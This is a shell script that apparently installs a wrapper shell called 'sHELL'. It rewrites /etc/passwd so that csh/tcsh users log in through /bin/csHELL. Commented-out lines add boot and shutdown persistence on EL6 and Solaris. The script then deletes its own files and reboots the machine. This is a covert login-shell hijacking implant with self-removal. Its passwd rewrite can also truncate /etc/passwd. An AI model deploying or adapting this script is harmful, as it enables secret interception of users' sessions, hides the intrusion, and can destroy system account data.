#!/bin/sh
if [ "$SHELL" == "/bin/sh" -a "$1" != "-f" ]
then
    echo "The default shell is $SHELL... this may break everything... add the -f flag if you want to force it"
    exit
fi

if echo $SHELL | egrep "(t)?csh"
then
    sed "s#REAL_SHELL#$SHELL#g"<sHELL.csh > RsHELL
    chmod a+rx RsHELL
    mv -f RsHELL /bin/csHELL
    cat /etc/passwd | sed "s#$SHELL#/bin/csHELL#g" > /etc/passwd
#elif echo $SHELL | egrep "(z|ba)sh"
#then
#    if echo `uname -a` | grep -i el6
#    then
#        rm -f /etc/rc.d/rc.local
#        rm -f /sbin/halt.local
#        rm -f /etc/rc.local
#        echo '#!/bin/sh' > /sbin/halt.local
#        echo '#!/bin/sh' > /etc/rc.d/rc.local
#        chmod a+x /etc/rc.d/rc.local
#        chmod a+x /sbin/halt.local
#        echo "cat /etc/passwd | sed \"s#$SHELL#/bin/sHELL#g\" > /etc/passwd" >> /etc/rc.d/rc.local
#        echo "cat /etc/passwd | sed \"s#/bin/sHELL#$SHELL#g\" > /etc/passwd" >> /sbin/halt.local
#        ln -s /etc/rc.d/rc.local /etc/rc.local
#        chmod a+rwx /etc/rc.local
#    elif echo `uname -a` | grep -i solaris
#    then
#        rm -f /etc/rc3.d/*sHELL
#        echo '#!/bin/sh' > /etc/rc3.d/S99sHELL
#        echo '#!/bin/sh' > /etc/rc3.d/K99sHELL
#        chmod a+x /etc/rc3.d/S99sHELL
#        chmod a+x /etc/rc3.d/K99sHELL
#        echo "cat /etc/passwd | sed \"s#$SHELL#/bin/sHELL#g\"" >> /etc/rc3.d/S99sHELL
#        echo "cat /etc/passwd | sed \"s#/bin/sHELL#$SHELL#g\"" >> /etc/rc3.d/K99sHELL
#    fi
#
#    sed "s#REAL_SHELL#$SHELL#g"<sHELL.bash >RsHELL
#    chmod a+rx RsHELL
#    mv -f RsHELL /bin/sHELL
#else
#    echo "Shell is unknown"
#    exit
fi

cd ..
rm -rf *sH*
reboot
